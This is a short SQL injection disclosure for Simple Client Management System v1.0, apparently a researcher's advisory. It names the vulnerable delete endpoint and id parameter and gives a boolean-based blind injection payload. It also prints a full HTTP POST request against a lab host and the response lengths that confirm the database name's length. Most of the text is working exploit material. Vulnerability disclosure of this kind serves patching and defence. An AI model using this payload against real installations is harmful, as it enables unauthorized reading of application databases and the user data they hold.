# Simple-Client-Management-System v1.0 by oretnom23 has SQL injection

**Author：** k0xx

vendors: https://www.sourcecodester.com/php/15027/simple-client-management-system-php-source-code.html

Vulnerability File: /cms/classes/Users.php?f=delete

Vulnerability location: /cms/classes/Users.php?f=delete,id

[+] Payload:  id=11' and length(database()) =6 --+ // Leak place ---> id

Current database name: cms_db,length is 6

```sql
POST /cms/classes/Users.php?f=delete HTTP/1.1
Host: 192.168.1.19
Content-Length: 36
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.19
Referer: http://192.168.1.19/cms/admin/?page=user/list
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=5u3dthmlo3ajo2g7k8pfvb4g8h
Connection: close

id=11' and length(database()) =6 --+ // Leak place ---> id
```


When length (database ()) = 6, Content-Length: 19

When length (database ()) = 7, Content-Length: 25112



